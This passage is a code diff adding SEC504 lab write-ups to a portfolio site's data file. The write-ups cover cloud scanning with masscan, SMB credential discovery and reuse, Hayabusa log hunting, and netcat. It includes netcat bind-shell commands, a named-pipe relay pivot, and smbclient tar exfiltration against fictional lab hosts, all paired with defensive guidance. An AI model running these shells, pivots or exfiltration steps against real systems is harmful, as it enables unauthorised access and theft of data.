@@ -2982,6 +2982,1339 @@ export const LABS: CybersecurityLab[] = [
       { src: "/labs/nmap-discovery-144124.png", alt: "Targeted mongodb-databases script", caption: "--script mongodb-databases re-pulls the inventory in 0.50s" },
     ],
   },
+  {
+    id: 26,
+    courseSlug: "sec504",
+    slug: "cloud-attack-surface-mapping",
+    title: "Cloud Attack Surface Mapping with masscan and TLS Fingerprinting",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Cloud Network Forensics",
+    level: "SEC504",
+    date: "Jun 2026",
+    artifacts: "Sanitized masscan, tls-scan, jq, and nmap output from the SEC504 Slingshot Linux lab against a 10.200.0.0/16 cloud range",
+    context:
+      "Cloud IP space has no reverse DNS to map an address back to an owner, so this lab uses the TLS certificate as the attribution mechanism. The workflow is: sweep a /16 with masscan for one port, pull each host's certificate with tls-scan, parse the subject common name with jq to find which anonymous cloud IP belongs to the target organization, then enumerate that host with nmap.",
+    summary:
+      "Swept 65,536 addresses in 10.200.0.0/16 for port 443 with masscan at 10,000 packets/sec, which returned 14 live TLS hosts. Extracted the IPs with awk, pulled every certificate with tls-scan (14/14 handshakes in 0.13s), and parsed the subject CN with jq. Most certs were wildcards for unrelated tenants (*.genusight.com, *.sunsetisp.com, *.wright.art), but one host, 10.200.74.2, presented downloads.falsimentis.com, the target. An nmap http-enum against it found nginx 1.18.0 exposing /robots.txt and a /css/ directory listing.",
+    whyThisMatters:
+      "In shared cloud ranges you cannot tell whose asset an IP is by the address alone, and that is exactly the gap an attacker exploits to find a target's forgotten internet-facing hosts. The TLS certificate is the tell: the subject CN names the service even when DNS says nothing. The same masscan-to-certificate pipeline a red team uses to find your shadow assets is what an asset-management program should run against its own ranges first.",
+    tldr: [
+      "masscan swept a /16 (65,536 hosts) for port 443 in seconds and found 14 live TLS endpoints",
+      "tls-scan + jq parsed each certificate's subject CN to attribute anonymous cloud IPs to their owners",
+      "One cert (downloads.falsimentis.com on 10.200.74.2) identified the target; nmap http-enum found a directory listing",
+    ],
+    skillsDemonstrated: [
+      "High-rate network sweeping with masscan (--rate, -oL)",
+      "TLS certificate collection and parsing (tls-scan)",
+      "JSON field extraction with jq",
+      "Cloud asset attribution via certificate subject CN",
+      "Targeted web enumeration with nmap NSE (http-enum)",
+    ],
+    tools: ["masscan 1.3.9", "tls-scan", "jq", "awk", "Nmap 7.60", "Slingshot Linux"],
+    steps: [
+      "Sweep 10.200.0.0/16 for port 443 with masscan and save a list file",
+      "Extract just the live IPs with awk",
+      "Collect every host's TLS certificate with tls-scan into JSON",
+      "Parse the subject CN per IP with jq to attribute owners",
+      "Grep the target org's domain out of the parsed output",
+      "Enumerate the identified web host with nmap http-enum",
+    ],
+    stepDetails: [
+      {
+        title: "Mass-sweep the /16 for port 443",
+        description:
+          "Ran masscan across the entire 10.200.0.0/16 (65,536 hosts) for a single port at 10,000 packets/sec. The list output (-oL) recorded 14 open 443/tcp hosts. Scanning one port across a huge range is the fast way to find the live TLS surface before spending time on any single host.",
+        command: "masscan -p 443 --rate 10000 -oL simcloud.txt 10.200.0.0/16\nwc -l simcloud.txt",
+        commandBreakdown: "-p 443: single port\n--rate 10000: packets per second\n-oL: list output format",
+        screenshot: "/labs/cloud-recon-154120.png",
+      },
+      {
+        title: "Extract the live IPs",
+        description:
+          "masscan -oL lines look like 'open tcp 443 10.200.x.x <epoch>'. awk pulled field 4 (the IP) into a clean target list for the certificate scan.",
+        command: "awk '/open/ {print $4}' simcloud.txt > simcloud-targets.txt",
+        commandBreakdown: "/open/: match result lines\n{print $4}: the IP address column",
+        screenshot: "/labs/cloud-recon-154334.png",
+      },
+      {
+        title: "Collect TLS certificates",
+        description:
+          "tls-scan read the target list on stdin and completed all 14 handshakes in 0.13 seconds, writing structured JSON. This is the step that turns a list of anonymous IPs into a set of certificates that name their services.",
+        command: "tls-scan --port=443 --cacert=/opt/tls-scan/ca-bundle.crt -o simcloud-tlsinfo.json < simcloud-targets.txt",
+        commandBreakdown: "--port=443: TLS port\n--cacert: CA bundle for chain validation\n-o: JSON output; reads targets on stdin",
+        screenshot: "/labs/cloud-recon-154558.png",
+      },
+      {
+        title: "Attribute IPs by certificate subject CN",
+        description:
+          "jq projected each IP next to its certificate subject CN. Most were wildcards for unrelated tenants sharing the cloud range (*.genusight.com, *.sunsetisp.com). One stood out: 10.200.74.2 presenting downloads.falsimentis.com, the target organization.",
+        command: "jq '.ip + \" \" + .certificateChain[].subjectCN' simcloud-tlsinfo.json\njq '.ip + \" \" + .certificateChain[].subjectCN' simcloud-tlsinfo.json | grep falsimentis",
+        commandBreakdown: "certificateChain[].subjectCN: the CN names the service\ngrep isolates the target's asset",
+        screenshot: "/labs/cloud-recon-154644.png",
+      },
+      {
+        title: "Enumerate the identified host",
+        description:
+          "With the target IP known, nmap -sV plus the http-enum NSE script fingerprinted nginx 1.18.0 and surfaced /robots.txt and a browsable /css/ directory listing. Attribution first, enumeration second, so the noisy scan only ever touches the one host that matters.",
+        command: "sudo nmap -sT -sV -p 443 --script http-enum 10.200.74.2",
+        commandBreakdown: "-sV: version detection\n--script http-enum: enumerate web paths",
+        screenshot: "/labs/cloud-recon-154815.png",
+      },
+    ],
+    outcome:
+      "Reduced a 65,536-address cloud range to the single host that belonged to the target by pivoting on TLS certificate subject CNs, then confirmed an exposed directory listing on it. 14 live TLS hosts, one match, one finding, in well under a minute of active scanning.",
+    nextStepsInProduction:
+      "Run the same masscan-to-certificate sweep against your own cloud ranges on a schedule and diff the results so newly exposed hosts and unexpected certificate names get flagged as possible shadow assets. Remove directory listing (autoindex off) on the identified nginx host and review what /css/ and /robots.txt exposed. Feed discovered certificates into an inventory keyed on subject CN so attribution is automatic next time.",
+    securityControlsRelevant: [
+      "Continuous external attack surface management over owned cloud ranges",
+      "Certificate transparency / inventory keyed on subject CN",
+      "Disabling directory listing (autoindex) on web servers",
+      "Egress and ingress controls limiting which cloud hosts expose 443",
+    ],
+    keyFindings: [
+      "masscan found 14 live 443/tcp hosts in a 65,536-address /16 in seconds",
+      "TLS certificate subject CN attributed each anonymous cloud IP to an owner",
+      "10.200.74.2 = downloads.falsimentis.com, the target, isolated by a single grep",
+      "nginx 1.18.0 on the target exposed /robots.txt and a /css/ directory listing",
+    ],
+    takeaway: [
+      "The lesson that transfers to real cloud security is that DNS is not the source of truth for who owns an IP; the certificate is. In a shared range, a reverse lookup gives you nothing, but the TLS handshake hands you the service name for free. Any attacker who can sweep a range can attribute it, which means defenders have no advantage here unless they are running the same sweep against their own space first.",
+      "Speed is the point of the masscan stage. Sweeping 65,536 hosts for one port takes seconds, which changes the economics of reconnaissance: an attacker does not need to know where your assets are, they can afford to look at an entire /16 and let the certificates sort out ownership. Asset management that relies on a hand-maintained list will always be behind the tool that just scans everything.",
+    ],
+    screenshots: [
+      { src: "/labs/cloud-recon-154120.png", alt: "masscan sweep of the /16", caption: "masscan -p 443 --rate 10000 across 65,536 hosts returns 14 live TLS endpoints" },
+      { src: "/labs/cloud-recon-154158.png", alt: "masscan list output", caption: "simcloud.txt: open tcp 443 records, one per live host" },
+      { src: "/labs/cloud-recon-154334.png", alt: "Extract IPs with awk", caption: "awk '/open/ {print $4}' pulls the 14 target IPs" },
+      { src: "/labs/cloud-recon-154558.png", alt: "tls-scan certificate collection", caption: "tls-scan completes 14/14 handshakes in 0.13s" },
+      { src: "/labs/cloud-recon-154644.png", alt: "jq subject CN parsing", caption: "jq maps each IP to its certificate CN; 10.200.74.2 = downloads.falsimentis.com" },
+      { src: "/labs/cloud-recon-154815.png", alt: "nmap http-enum on the target", caption: "http-enum: nginx 1.18.0, /robots.txt, and a /css/ directory listing" },
+    ],
+  },
+  {
+    id: 27,
+    courseSlug: "sec504",
+    slug: "smb-share-enumeration-credential-discovery",
+    title: "SMB Share Enumeration and Credential Discovery",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Network Security",
+    level: "SEC504",
+    date: "Jun 2026",
+    artifacts: "Sanitized smbclient session output from the SEC504 Slingshot Linux lab against a file server at 172.30.0.22 (FLSM-NAS)",
+    context:
+      "This lab walks a full SMB compromise chain against a NAS: enumerate shares with one set of credentials, read a home directory the account should not have been able to reach, find a stale PowerShell backup script with a hardcoded password, and reuse that password to reach a second share holding a full database backup. Every step uses smbclient, the point being that the whole chain runs from readable files and reused credentials, not an exploit.",
+    summary:
+      "Started with credentials for tdoudney and listed shares on 172.30.0.22 (IT, CustomerDev, Home, plus the default SYSVOL/NETLOGON/C$/ADMIN$/IPC$). The IT share held logon.cmd (drive mappings) and netssh.cmd (a proxy config pointing at proxy.falsimentis.com:3128). The Home share exposed every user's directory; csparkes was correctly locked (ACCESS_DENIED) but tdoudney's own directory held backup.ps1 and backup.ps1.OLD. The current script used Get-Credential correctly, but the .OLD version hardcoded ConvertTo-SecureString 'Clippers2022' for falsimentis.com\\csparkes. Reusing csparkes/Clippers2022 opened the CustomerDev share, which contained a web app tree and db.backup.sql.zip (33.8 MB).",
+    whyThisMatters:
+      "SMB shares are where organizations quietly leak the material an attacker needs to move laterally: logon scripts, proxy configs, and backup scripts with credentials baked in. Nothing here was an exploit. It was a readable file share, correct permissions on one directory and not another, and a password that lived on in a .OLD file after someone did the right thing and switched the live script to Get-Credential. That last detail is the whole lesson: fixing the current file does not remove the secret from the old one.",
+    tldr: [
+      "smbclient enumerated shares on a NAS and exfiltrated a full home directory in a single tar command",
+      "A stale backup.ps1.OLD hardcoded ConvertTo-SecureString 'Clippers2022' for another user (csparkes)",
+      "Reusing that credential opened a second share holding a 33.8 MB database backup (db.backup.sql.zip)",
+    ],
+    skillsDemonstrated: [
+      "SMB share enumeration with smbclient (-L, user%pass)",
+      "Interactive smbclient navigation and file retrieval",
+      "In-session exfiltration with smbclient tar",
+      "Credential discovery in logon and backup scripts",
+      "Lateral movement via credential reuse",
+    ],
+    tools: ["smbclient", "Nmap 7.60", "tar", "Slingshot Linux", "CLI"],
+    steps: [
+      "Confirm the NAS is up and 139/445 are open with nmap",
+      "List shares with smbclient, first prompting then inline credentials",
+      "Read the IT share: logon.cmd drive maps and netssh.cmd proxy config",
+      "Browse the Home share and confirm per-user ACLs",
+      "Exfiltrate a home directory with smbclient tar and extract locally",
+      "Read backup.ps1.OLD and recover the hardcoded credential",
+      "Reuse the credential to open the CustomerDev share",
+    ],
+    stepDetails: [
+      {
+        title: "Confirm the target and enumerate shares",
+        description:
+          "nmap confirmed only 172.30.0.22 was up with 139/netbios-ssn and 445/microsoft-ds open. smbclient -L listed the shares. Passing credentials inline as user%pass avoids the prompt; the SMB1 workgroup-listing failure at the end is expected because SMB1 is disabled.",
+        command: "sudo nmap -sT -p 139,445 172.30.0.2-254\nsmbclient -L //172.30.0.22 -U tdoudney%Falsimentis123",
+        commandBreakdown: "-L: list shares\n-U user%pass: inline credentials",
+        screenshot: "/labs/smb-security-101623.png",
+      },
+      {
+        title: "Read the IT share scripts",
+        description:
+          "The IT share held logon.cmd and netssh.cmd. logon.cmd mapped drives (net use z: \\\\FLSM-NAS\\Users), and netssh.cmd set a WinHTTP proxy to proxy.falsimentis.com:3128. Logon scripts are reconnaissance gold: they name internal hosts, shares, and the proxy an attacker would route through.",
+        command: "smbclient //172.30.0.22/IT -U tdoudney%Falsimentis123\nget logon.cmd\nget netssh.cmd",
+        commandBreakdown: "get <file>: download from the share\nlogon.cmd/netssh.cmd reveal internal infrastructure",
+        screenshot: "/labs/smb-security-101929.png",
+      },
+      {
+        title: "Browse Home and check per-user ACLs",
+        description:
+          "The Home share exposed csparkes, ttidmas, and tdoudney directories. csparkes was correctly protected (NT_STATUS_ACCESS_DENIED on ls), but tdoudney's own directory was readable and held backup.ps1, backup.ps1.OLD, and a ScoutSuite report.",
+        command: "smbclient //172.30.0.22/Home -U tdoudney%Falsimentis123\ncd csparkes\nls\ncd ../tdoudney\nls",
+        commandBreakdown: "ACCESS_DENIED on csparkes = correct ACL; tdoudney's own dir is readable",
+        screenshot: "/labs/smb-security-102921.png",
+      },
+      {
+        title: "Exfiltrate the home directory in one command",
+        description:
+          "smbclient's built-in tar streamed the whole directory (16.2 MB) into a single local tarball, then extracted it. One command exfiltrates an entire share path, no per-file get loop needed.",
+        command: "tar c tdoudney-home.tar\n# locally:\ntar xf tdoudney-home.tar",
+        commandBreakdown: "tar c: create archive of the current share path\nStreams every file in one operation",
+        screenshot: "/labs/smb-security-103012.png",
+      },
+      {
+        title: "Recover the hardcoded credential",
+        description:
+          "backup.ps1 correctly used Get-Credential (interactive, no stored secret). But backup.ps1.OLD hardcoded ConvertTo-SecureString 'Clippers2022' -AsPlainText -Force for falsimentis.com\\csparkes. Someone fixed the live script and left the password sitting in the .OLD copy.",
+        command: "cat backup.ps1\ncat backup.ps1.OLD",
+        commandBreakdown: "The .OLD file still contains the plaintext password the live script no longer stores",
+        screenshot: "/labs/smb-security-103345.png",
+      },
+      {
+        title: "Reuse the credential for lateral movement",
+        description:
+          "csparkes/Clippers2022 opened the CustomerDev share, which held a full web application tree (index.php, install.php, version.php, engine/, mod/) and db.backup.sql.zip at 33.8 MB. A stale password in one user's home directory became read access to another user's database backup.",
+        command: "smbclient //172.30.0.22/CustomerDev -U csparkes%Clippers2022\ncd FS\nls",
+        commandBreakdown: "Reused discovered credential; CustomerDev holds the app source + db backup",
+        screenshot: "/labs/smb-security-103559.png",
+      },
+    ],
+    outcome:
+      "Chained SMB share enumeration into lateral movement without a single exploit: readable logon scripts, a home directory with correct ACLs on one folder and a leaked script in another, a hardcoded credential in a stale backup file, and credential reuse into a share holding a 33.8 MB database backup.",
+    nextStepsInProduction:
+      "Rotate the csparkes credential immediately and grep every share for ConvertTo-SecureString, -AsPlainText, and password patterns in .ps1/.OLD/.bak files. Move backup credentials to a managed secret store (or gMSA) so scripts never hold plaintext. Audit share ACLs so home directories are per-user private by default, and remove stale .OLD/.bak script copies. Enable SMB access auditing so mass reads like the tar exfiltration are visible.",
+    securityControlsRelevant: [
+      "Secret management for service and backup credentials (no plaintext in scripts)",
+      "Least-privilege share ACLs (per-user private home directories)",
+      "Removal of stale .OLD/.bak script copies",
+      "SMB access and file-read auditing",
+      "Credential rotation on discovery of exposure",
+    ],
+    keyFindings: [
+      "Home share exposed all user directories; csparkes correctly denied, tdoudney readable",
+      "backup.ps1.OLD hardcoded 'Clippers2022' for falsimentis.com\\csparkes",
+      "Live backup.ps1 correctly used Get-Credential; the leak was only in the .OLD copy",
+      "csparkes/Clippers2022 opened CustomerDev, exposing db.backup.sql.zip (33.8 MB)",
+      "smbclient tar exfiltrated a 16.2 MB home directory in one command",
+    ],
+    takeaway: [
+      "The single most important detail is the .OLD file. The developer did the right thing: the live backup.ps1 uses Get-Credential and stores nothing. But the previous version, with the password compiled in, was never deleted. Remediation that only touches the current file leaves the secret fully recoverable in version history, backup copies, and stale filenames. Rotating the credential is the only fix that actually works, because you can never be sure you have found every copy.",
+      "Nothing in this chain was an exploit, and that is what makes it realistic. Share enumeration, a readable logon script, a home directory, credential reuse: every step is a normal file operation that a legitimate user could perform. Defenses that wait for an exploit signature will never fire here. The controls that matter are permissions, secret hygiene, and access auditing, none of which involve a CVE.",
+    ],
+    screenshots: [
+      { src: "/labs/smb-security-101337.png", alt: "nmap for SMB ports", caption: "172.30.0.22 up with 139/netbios-ssn and 445/microsoft-ds" },
+      { src: "/labs/smb-security-101445.png", alt: "smbclient share listing prompt", caption: "smbclient -L prompts for tdoudney's password" },
+      { src: "/labs/smb-security-101623.png", alt: "Share list with inline credentials", caption: "Shares: IT, CustomerDev, Home, SYSVOL, NETLOGON, C$, ADMIN$, IPC$" },
+      { src: "/labs/smb-security-101859.png", alt: "IT share contents", caption: "IT share: logon.cmd, netssh.cmd, articles/" },
+      { src: "/labs/smb-security-101929.png", alt: "logon.cmd drive mappings", caption: "logon.cmd maps z: to \\\\FLSM-NAS\\Users and h: to Home" },
+      { src: "/labs/smb-security-102015.png", alt: "get netssh.cmd", caption: "Retrieving netssh.cmd from the IT share" },
+      { src: "/labs/smb-security-102056.png", alt: "netssh.cmd proxy config", caption: "netsh winhttp set proxy proxy.falsimentis.com:3128" },
+      { src: "/labs/smb-security-102723.png", alt: "Home share user directories", caption: "Home share exposes csparkes, ttidmas, tdoudney" },
+      { src: "/labs/smb-security-102921.png", alt: "Per-user ACL check", caption: "csparkes denied (correct ACL); tdoudney readable with backup.ps1 + .OLD" },
+      { src: "/labs/smb-security-103012.png", alt: "smbclient tar exfiltration", caption: "tar c exfiltrates 16.2 MB in one command" },
+      { src: "/labs/smb-security-103253.png", alt: "Extract the tarball locally", caption: "tar xf tdoudney-home.tar unpacks the exfiltrated files" },
+      { src: "/labs/smb-security-103314.png", alt: "Extracted home directory", caption: "backup.ps1, backup.ps1.OLD, images, and ScoutSuite.zip" },
+      { src: "/labs/smb-security-103345.png", alt: "Hardcoded credential in backup.ps1.OLD", caption: "backup.ps1.OLD: ConvertTo-SecureString 'Clippers2022' for csparkes" },
+      { src: "/labs/smb-security-103559.png", alt: "Lateral move to CustomerDev", caption: "csparkes/Clippers2022 opens CustomerDev with db.backup.sql.zip (33.8 MB)" },
+    ],
+  },
+  {
+    id: 28,
+    courseSlug: "sec504",
+    slug: "windows-event-log-threat-hunting-hayabusa",
+    title: "Windows Event Log Threat Hunting with Hayabusa and Sigma",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Threat Hunting",
+    level: "SEC504",
+    date: "Jun 2026",
+    artifacts: "Sanitized Hayabusa CSV timeline and Timeline Explorer views from the SEC504 lab against a compromised Windows 10 EVTX set",
+    context:
+      "This lab runs Hayabusa, a Sigma-based EVTX detection engine, over a compromised Windows 10 event log set (361 files, 35.5 MB) and triages the results in Timeline Explorer. The point is data reduction: turning thousands of raw events into a ranked list of detections, then grouping to find the handful of high-severity alerts that describe the actual attack.",
+    summary:
+      "Ran Hayabusa csv-timeline over 361 EVTX files with the full rule set (4,151 detection rules: 167 Hayabusa + 3,984 Sigma). After channel filtering, 2,031 rules ran against 16 relevant logs. Of 4,419 events, 2,983 produced hits (32.5% reduction), collapsing to 33 unique detections: 0 critical, 3 high, 66 medium, 1,573 low, 1,347 informational. All 3 high alerts were log-clearing (Important Log File Cleared x2, Log Cleared x1), a classic anti-forensics signal. Loaded the CSV into Timeline Explorer, grouped by Level then Rule Title, and reconstructed the anti-forensics window: six consecutive log-clear events at 10:18:28, then logoff and Event Log Service stopped seconds later.",
+    whyThisMatters:
+      "An analyst cannot read 4,419 raw events, but they can act on 33 detections and read 3 high alerts. Hayabusa applies the open Sigma rule set to Windows logs to do that reduction, and the grouping step in Timeline Explorer is what turns the output into an incident narrative. The high alerts here were all log clearing, which is the tell that an attacker tried to erase their tracks, and finding it fast is the difference between catching the intrusion and cleaning it up later.",
+    tldr: [
+      "Hayabusa applied 4,151 Sigma + Hayabusa rules to 361 EVTX files, reducing 4,419 events to 33 unique detections",
+      "All 3 high-severity alerts were log-clearing events, a direct anti-forensics indicator",
+      "Timeline Explorer grouping reconstructed the sequence: six log-clears, then logoff, then Event Log Service stopped",
+    ],
+    skillsDemonstrated: [
+      "Sigma-based EVTX detection with Hayabusa (csv-timeline)",
+      "Rule-set selection and channel filtering",
+      "Severity-based triage of detection output",
+      "Timeline Explorer grouping and pivoting",
+      "Anti-forensics (log-clearing) detection",
+    ],
+    tools: ["Hayabusa 2.16.0", "Sigma rules", "Timeline Explorer 2.0", "Windows 10", "EVTX"],
+    steps: [
+      "Review Hayabusa subcommands and pick csv-timeline",
+      "Run csv-timeline over the EVTX directory with the full rule set",
+      "Read the scan summary: rules loaded, events, data reduction",
+      "Read the results summary by severity",
+      "Read the top alerts per severity level",
+      "Load the CSV into Timeline Explorer and group by Level then Rule Title",
+      "Reconstruct the anti-forensics timeline from the grouped rows",
+    ],
+    stepDetails: [
+      {
+        title: "Choose the detection subcommand",
+        description:
+          "hayabusa.exe with no arguments lists the subcommands: csv-timeline and json-timeline for full detection output, plus logon-summary, eid-metrics, and search for quick pivots. csv-timeline is the one that produces a Timeline Explorer-ready file.",
+        command: ".\\hayabusa.exe",
+        commandBreakdown: "csv-timeline: full detection timeline\nlogon-summary/eid-metrics: quick stats",
+        screenshot: "/labs/hayabusa-103717.png",
+      },
+      {
+        title: "Run the full detection timeline",
+        description:
+          "Ran csv-timeline over the EVTX directory. The scan wizard offered rule set 5 (all event and alert rules, 4,417) and prompted for deprecated, unsupported, noisy, and sysmon rules. Including sysmon rules (3,685) added meaningful coverage. Total input: 361 EVTX files, 35.5 MB.",
+        command: ".\\hayabusa.exe csv-timeline --directory C:\\Tools\\win10evtx\\ -o win10-threatdetect.csv --no-color",
+        commandBreakdown: "--directory: EVTX folder\n-o: output CSV\n--no-color: clean output for redirection",
+        screenshot: "/labs/hayabusa-104043.png",
+      },
+      {
+        title: "Read the scan summary and data reduction",
+        description:
+          "After channel filtering, 16 logs matched and 2,031 rules ran (167 Hayabusa + 3,984 Sigma = 4,151 total). Of 4,419 events, 2,983 produced hits, a 32.5% reduction. The value of a detection engine is exactly this: it tells you which fraction of events are worth an analyst's attention.",
+        command: "# scan summary section of the run",
+        commandBreakdown: "4,151 rules over 16 logs; 4,419 events -> 2,983 with hits",
+        screenshot: "/labs/hayabusa-104135.png",
+      },
+      {
+        title: "Triage by severity",
+        description:
+          "The results summary broke 2,989 total detections into 33 unique: 0 critical, 3 high (2 unique), 66 medium, 1,573 low, 1,347 informational. Three high alerts is a list an analyst can actually read, which is the entire goal of running the engine first.",
+        command: "# results summary section",
+        commandBreakdown: "0 critical / 3 high / 66 medium / 1,573 low / 1,347 info",
+        screenshot: "/labs/hayabusa-104153.png",
+      },
+      {
+        title: "Read the top alerts and spot the anti-forensics",
+        description:
+          "The top high alerts were all log-clearing: Important Log File Cleared (x2) and Log Cleared (x1). Top medium included Potentially Malicious PowerShell (57) and password guessing/spray. Log clearing at the top of the high list is the signal that someone tried to erase evidence.",
+        command: "# top alerts by severity",
+        commandBreakdown: "High = log clearing; medium = malicious PowerShell + password attacks",
+        screenshot: "/labs/hayabusa-104206.png",
+      },
+      {
+        title: "Group in Timeline Explorer and rebuild the sequence",
+        description:
+          "Loaded the CSV into Timeline Explorer and dragged the Level and Rule Title headers to group. This collapsed 2,989 rows into a readable tree and exposed the anti-forensics window: six consecutive Log Cleared events at 10:18:28-29, then Logoff / RDS Session Logoff at 10:19:06, then Event Log Service Stopped at 10:19:08. The cell viewer showed the full EID 4104 ScriptBlock text for the PowerShell hits.",
+        command: "# Timeline Explorer: drag Level, then Rule Title, to the group bar",
+        commandBreakdown: "Grouping turns a flat CSV into an incident timeline",
+        screenshot: "/labs/hayabusa-104739.png",
+      },
+    ],
+    outcome:
+      "Reduced 4,419 raw Windows events to 33 unique detections and 3 high-severity alerts, all of which were log-clearing. Grouping in Timeline Explorer reconstructed a clear anti-forensics sequence (mass log clear, then logoff, then Event Log Service stopped), giving an incident narrative from what started as an unreadable pile of EVTX files.",
+    nextStepsInProduction:
+      "Forward EVTX to a SIEM and run Sigma rules continuously rather than after the fact, alerting immediately on 1102 (Security log cleared) and 104 (log cleared) since those were the high-fidelity indicators here. Enable PowerShell script-block logging (4104) fleet-wide so the malicious-PowerShell detections have full command text. Baseline normal logon and account-management volume so the low/informational tier (explicit logons, group changes) can be diffed rather than read.",
+    securityControlsRelevant: [
+      "Centralized log forwarding to a SIEM (logs off the host beat log clearing)",
+      "Alerting on log-clear events (Security 1102, System 104)",
+      "PowerShell script-block logging (EID 4104)",
+      "Sigma rule coverage and tuning",
+      "Baselining of logon and account-management event volume",
+    ],
+    keyFindings: [
+      "4,151 rules over 16 logs reduced 4,419 events to 33 unique detections (32.5% hit rate)",
+      "All 3 high-severity alerts were log-clearing (anti-forensics)",
+      "Top medium detection was Potentially Malicious PowerShell (57 hits)",
+      "Timeline: six log-clears at 10:18:28, logoff at 10:19:06, Event Log Service stopped at 10:19:08",
+      "EID 4104 script-block text was recoverable in the Timeline Explorer cell viewer",
+    ],
+    takeaway: [
+      "The number that matters is 4,419 down to 33. No analyst triages four thousand events, but everyone can read thirty-three detections and act on three high alerts. That reduction is the entire argument for running a Sigma engine over raw logs before a human looks at them, and it is why detection-as-code beats manual log review at any real scale.",
+      "Log clearing being the top high-severity finding is the tell. An attacker who clears logs is telling you two things: they had the privilege to do it, and they expected someone to look. The defensive countermove is to get logs off the host in real time, because once they are in a SIEM, clearing the local copy destroys nothing and the clear event itself becomes one of your highest-fidelity alerts.",
+    ],
+    screenshots: [
+      { src: "/labs/hayabusa-103717.png", alt: "Hayabusa subcommands", caption: "Hayabusa 2.16.0 subcommands: csv-timeline, logon-summary, search, and more" },
+      { src: "/labs/hayabusa-104043.png", alt: "csv-timeline scan wizard", caption: "Scanning 361 EVTX files (35.5 MB) with the full rule set incl. sysmon rules" },
+      { src: "/labs/hayabusa-104135.png", alt: "Rule and channel summary", caption: "4,151 rules; after channel filter 16 logs and 2,031 rules run" },
+      { src: "/labs/hayabusa-104153.png", alt: "Results summary by severity", caption: "4,419 events -> 33 unique detections: 0 crit, 3 high, 66 med, 1,573 low" },
+      { src: "/labs/hayabusa-104206.png", alt: "Top alerts by level", caption: "Top high alerts are all log-clearing; medium includes malicious PowerShell" },
+      { src: "/labs/hayabusa-104632.png", alt: "Timeline Explorer flat view", caption: "win10-threatdetect.csv loaded: 2,989 rows across all severities" },
+      { src: "/labs/hayabusa-104739.png", alt: "Grouped by Level and Rule Title", caption: "Grouping collapses the CSV; high = 3 (2 log-clear titles)" },
+      { src: "/labs/hayabusa-104939.png", alt: "EID 4104 script-block cell", caption: "Cell viewer shows the full PowerShell ScriptBlock text (EID 4104)" },
+    ],
+  },
+  {
+    id: 29,
+    courseSlug: "sec504",
+    slug: "netcat-transfer-shells-pivot-relays",
+    title: "Netcat for Data Transfer, Shells, and Pivot Relays",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Network Security",
+    level: "SEC504",
+    date: "Jun 2026",
+    artifacts: "Sanitized netcat session output across Linux and Windows hosts from the SEC504 lab, including a named-pipe relay pivot",
+    context:
+      "This lab exercises netcat across every mode that matters in an intrusion: chat, file transfer in both directions, bind shells on Linux and Windows, and a bidirectional relay that pivots through a compromised host to reach a network the attacker cannot touch directly. The through-line is that one small binary is a Swiss-army knife for moving data and access once you have a foothold.",
+    summary:
+      "Used netcat between a Slingshot Linux host and a Windows host for listener/client chat, then transferred files both ways (Get-Content piped into nc on Windows, redirect out on Linux, and the reverse with Out-File). Set up bind shells on both operating systems (nc -l -p 7777 -e /bin/sh on Linux; nc <ip> 8888 -e cmd.exe on Windows), confirming SYSTEM-adjacent context on each. The finale was a pivot: the attacker could not reach 172.30.0.55, but a compromised pivot host at 172.30.0.50 could. A named-pipe relay (mkfifo namedpipe; nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe) let the attacker curl the target through the pivot; the target's access log showed the pivot's IP, not the attacker's.",
+    whyThisMatters:
+      "Netcat is on nearly every host and blends into normal traffic, which is why it shows up in real intrusions for exactly these tasks. The relay is the part defenders underestimate: a compromised host becomes a transparent proxy, so the target logs the pivot's address and the attacker's real source never appears. Understanding the named-pipe trick is what lets an analyst read a proxied-connection log correctly instead of chasing the wrong IP.",
+    tldr: [
+      "One netcat binary handled chat, two-way file transfer, and bind shells on both Linux and Windows",
+      "A named-pipe relay (mkfifo + two nc processes) pivoted through a compromised host to an unreachable target",
+      "The target's access log recorded the pivot's IP, not the attacker's: the relay launders the source address",
+    ],
+    skillsDemonstrated: [
+      "netcat listener/client fundamentals (-l, -p)",
+      "Bidirectional file transfer over netcat",
+      "Bind shells with -e on Linux and Windows",
+      "Named-pipe (FIFO) bidirectional relays",
+      "Pivoting and source-IP obfuscation",
+    ],
+    tools: ["netcat (traditional)", "PowerShell", "mkfifo", "curl", "Slingshot Linux", "Windows 10"],
+    steps: [
+      "Confirm connectivity between the Linux and Windows hosts",
+      "Set up a listener/client chat session",
+      "Transfer a file Windows to Linux, then Linux to Windows",
+      "Open a bind shell on Linux and connect from Windows",
+      "Open a bind shell on Windows and connect from Linux",
+      "Build a named-pipe relay on a pivot host",
+      "Reach an otherwise-unreachable target through the pivot and confirm in logs",
+    ],
+    stepDetails: [
+      {
+        title: "Listener/client chat",
+        description:
+          "The simplest netcat use: a listener on one host (nc -l -p 2222) and a client connecting to it from the other. Whatever one side types, the other sees. This confirms bidirectional connectivity and is the mental model for every mode that follows.",
+        command: "# Linux listener\nnc -l -p 2222\n# Windows client\nnc 10.10.75.1 2222",
+        commandBreakdown: "-l: listen mode\n-p: port; same syntax on both OSes",
+        screenshot: "/labs/netcat-105856.png",
+      },
+      {
+        title: "File transfer, both directions",
+        description:
+          "Windows to Linux: pipe a file into a listener (Get-Content .\\text.txt | nc -l -p 1234) and redirect it out on the receiver (nc 10.10.0.1 1234 > received.txt). Then the reverse, with Out-File on the Windows side. netcat is a file-transfer tool as much as a shell tool.",
+        command: "# Win: Get-Content .\\text.txt | nc -l -p 1234\n# Linux: nc 10.10.0.1 1234 > received.txt\n# Linux: cat file.txt | nc 10.10.0.1 4321\n# Win: nc -l -p 4321 | Out-File received2.txt",
+        commandBreakdown: "Sender pipes in, receiver redirects out; works either direction",
+        screenshot: "/labs/netcat-110033.png",
+      },
+      {
+        title: "Bind shell on Linux",
+        description:
+          "nc -l -p 7777 -e /bin/sh binds a shell to a listener; the Windows client connects and runs commands on the Linux host. whoami/id confirmed the sec504 user and its group memberships (docker, sudo, and others worth noting for privilege escalation).",
